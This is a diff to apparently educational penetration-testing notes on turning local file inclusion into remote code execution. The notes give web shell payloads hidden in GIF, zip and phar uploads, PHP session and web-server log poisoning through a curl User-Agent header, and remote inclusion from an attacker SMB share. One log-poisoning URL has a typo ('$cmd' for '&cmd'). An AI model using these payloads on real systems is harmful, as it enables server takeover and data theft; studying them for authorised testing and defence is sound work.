@@ -103,5 +103,93 @@ impacket-smbserver -smb2support share $(pwd)
 Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=\\<OUR_IP>\share\shell.php&cmd=whoami`
 <br>*Note: we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default*
 
-### LFI and File Uploads
+#### LFI and File Uploads
+##### Crafting Malicious Image
+We can use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well.
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution. To include the uploaded file, we need to know the path to our uploaded file. If you inspect the source code you may find out the location. If it doesn't help, we can try to fuzz for an uploads directory and then fuzz for our uploaded file.
+After the upload visit the file:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+```
+##### ZIP Upload
+Sometimes we can utilize the zip wrapper to execute PHP code.
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+After the upload visit:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+##### Phar Upload
+First write the following PHP script into a shell.php file:
+```
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+Then we can compile it into a phar file and rename it to shell.jpg as follows:
+```
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+After the upload visit:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+#### Log Poisoning
+If we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. This attack has the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code.
+
+##### PHP Session Poisoning
+Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
+The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. To do that go the Dev tools and look at the Storage tab.
+After we find the PHPSESSID, we can visit:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+Maybe we find a value which is under our control. Lets say that we can control the language parameter, then put a URL encoded PHP code into that value:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+Finally, we can include the session file:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+*Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.*
+
+##### Server Log Poisoning
+Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs.
+
+Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.
+
+By default, Apache logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while Nginx logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations.
+
+*Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.*
+
+We can use BurpSuite or curl as follows:
+```
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+After that we can visit `index.php?language=/var/log/apache2/access.log$cmd=id`.
+
+*Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.*
+
+Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
+- `/var/log/sshd.log`
+- `/var/log/mail`
+- `/var/log/vsftpd.log`
+
+We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them.
+
+
+
+
+
+
 
